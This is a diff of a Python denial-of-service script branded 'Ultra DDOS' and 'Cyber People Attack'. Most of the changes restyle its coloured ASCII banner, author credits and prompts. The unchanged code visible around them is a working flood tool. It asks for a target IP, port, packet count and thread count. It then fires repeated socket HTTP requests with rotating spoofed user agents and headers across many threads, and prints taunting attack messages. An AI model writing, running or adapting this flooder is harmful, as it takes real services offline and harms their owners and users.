@@ -1,30 +1,31 @@
-
+#Ultra DDOS
 
 import socket
 import random
 import threading
 import requests
+import os
+def usage():
+    os.system("clear")
+    print ("\033[32m")
 
+print("               \033[31m░░██████ ░░███████   ░░██████   ")
+print("              ░░██   ░░█ ░░██ ░░██ ░░██  ░░██            ")
+print("             \033[1;30m░░██        ░░██ ░░██ ░░██  ░░██           ")
+print("              \033[37m░░██   ░░█ ░░██░███  ░░████████      ")
+print("               ░░██████  ░░██      ░░██  ░░██ \033[33mV.01.1 ")
+print(" ")
+print("""    --------->>>>>> \033[1;32mCYBER PEOPLE ATTACK \033[33m<<<<<<---------
 
-
-
-
-print("           ░██████  ░███████    ░██████   ")
-print("          ░█     ░█  ░██   ░█  ░██   ░██            ")
-print("         ░██         ░██  ░██  ░██   ░██           ")
-print("          ░█     ░█  ░██░███   ░████████      ")
-print("           ░██████   ░██       ░██   ░██ V.01 ")
-
-print("""--------->>>>>> CYBER PEOPLE ATTACK <<<<<<---------
-
-        =========                 =========
-        ============           ============
-        ===============     ===============
---------------------------------------------|
-[<>] Author1     : Abdullah AL Asad         |
-[<>] Author2     : Unknown                  |
-[<>] Author3     : Z3B4NK.                  |
---------------------------------------------|
+            \033[1;30m=========== ==\ <π  //== ===========
+                  ======== \===// ========
+                     ======      ======
+\033[34m--------------------------------------------|
+\033[33m[<>] Author1➠    : \033[1;32mAbdullah AL Asad         \033[34m|
+\033[33m[<>] Author2➠    : \033[1;32mPoison                   \033[34m|
+\033[33m[<>] Author3➠    : \033[1;32mZ3B4NK.                  \033[34m|
+\033[34m--------------------------------------------|
+━━━━━━━━•❅•°•❈•°•❅•━━━━━━━━━━━━━━━•❅•°•❈•°•❅•
 """)
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
@@ -57,7 +58,7 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
-ip = str(input('Your Target: '))
+ip = str(input('\033[33mInput your target IP: '))
 port = int(input('Port: '))
 pack = int(input('Packet/s: '))
 thread = int(input('Threads: '))
@@ -81,10 +82,10 @@ def start():
             for i in range(pack):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
-            print("Strong Attack {0}:{1} | send: {2}".format(str(ip), int(port), xx))
+            print("\033[32mCyber People Attack {0}:{1} | \033[31mSend Packet : {2}".format(str(ip), int(port), xx))
         except:
             s.close()
-            print('الهجوم بكل قوتك... Intifada ATTACK --------->>>>>>>>>>>> ☠️☠️☠️☠️☠️☠️☠️☠️☠️')
+            print('\033[32mالهجوم بكل قوتك... \033[33mIntifada ATTACK \033[1;30m--------->>>>>>>>>>>> ☠️☠️☠️☠️')
 
 for x in range(thread):
     thred = threading.Thread(target=start)
